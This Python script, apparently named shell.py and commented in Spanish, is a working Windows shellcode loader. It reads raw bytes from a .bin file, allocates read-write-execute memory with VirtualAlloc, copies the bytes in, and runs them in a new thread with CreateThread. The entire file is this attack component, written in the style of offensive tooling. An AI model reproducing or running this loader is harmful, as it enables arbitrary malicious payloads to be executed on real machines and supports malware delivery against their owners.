import sys
import ctypes
from ctypes import wintypes

# Constantes
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04

def obtener_arquitectura():
    """Devuelve 'x86' o 'x64' según el intérprete de Python"""
    return 'x64' if sys.maxsize > 2**32 else 'x86'

def ejecutar_shellcode(ruta_bin):
    # Leer el archivo .bin
    try:
        with open(ruta_bin, "rb") as f:
            shellcode = f.read()
    except Exception as e:
        print(f"[-] Error al leer el archivo: {e}")
        return

    if not shellcode:
        print("[-] El archivo está vacío")
        return

    print(f"[+] Shellcode cargado: {len(shellcode)} bytes")
    print(f"[*] Arquitectura de Python: {obtener_arquitectura()}")

    kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

    # 1. Reservar memoria con permisos RWX
    print("[*] Reservando memoria con VirtualAlloc...")
    ptr = kernel32.VirtualAlloc(
        None,                           # dirección cualquiera
        len(shellcode),                 # tamaño
        MEM_COMMIT | MEM_RESERVE,       # tipo de reserva
        PAGE_EXECUTE_READWRITE          # permisos RWX
    )

    if not ptr:
        error = ctypes.get_last_error()
        print(f"[-] VirtualAlloc falló. Código de error: {error} (0x{error:08X})")
        return

    print(f"[*] Memoria reservada en dirección: 0x{ptr:X}")

    # 2. Copiar el shellcode a la memoria
    print("[*] Copiando shellcode...")
    try:
        ctypes.memmove(ptr, shellcode, len(shellcode))
    except Exception as e:
        print(f"[-] Error al copiar shellcode: {e}")
        kernel32.VirtualFree(ptr, 0, 0x8000)  # MEM_RELEASE
        return

    print("[*] Shellcode copiado correctamente")

    # 3. Ejecutar en un hilo separado
    print("[*] Creando hilo de ejecución...")
    hilo = kernel32.CreateThread(
        None,           # atributos de seguridad
        0,              # tamaño de pila por defecto
        ptr,            # dirección de inicio (shellcode)
        None,           # parámetro para el hilo
        0,              # flag de creación
        None            # ID del hilo (no necesario)
    )

    if not hilo:
        error = ctypes.get_last_error()
        print(f"[-] CreateThread falló. Error: {error} (0x{error:08X})")
        kernel32.VirtualFree(ptr, 0, 0x8000)
        return

    print("[+] Shellcode ejecutándose en hilo secundario")
    
    # 4. Esperar a que el hilo termine (opcional, evita que el proceso acabe)
    kernel32.WaitForSingleObject(hilo, 0xFFFFFFFF)  # espera infinita
    kernel32.CloseHandle(hilo)
    # No liberamos la memoria porque el shellcode podría seguir usándola

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: python shell.py <ruta_del_archivo.bin>")
        sys.exit(1)
    ejecutar_shellcode(sys.argv[1])
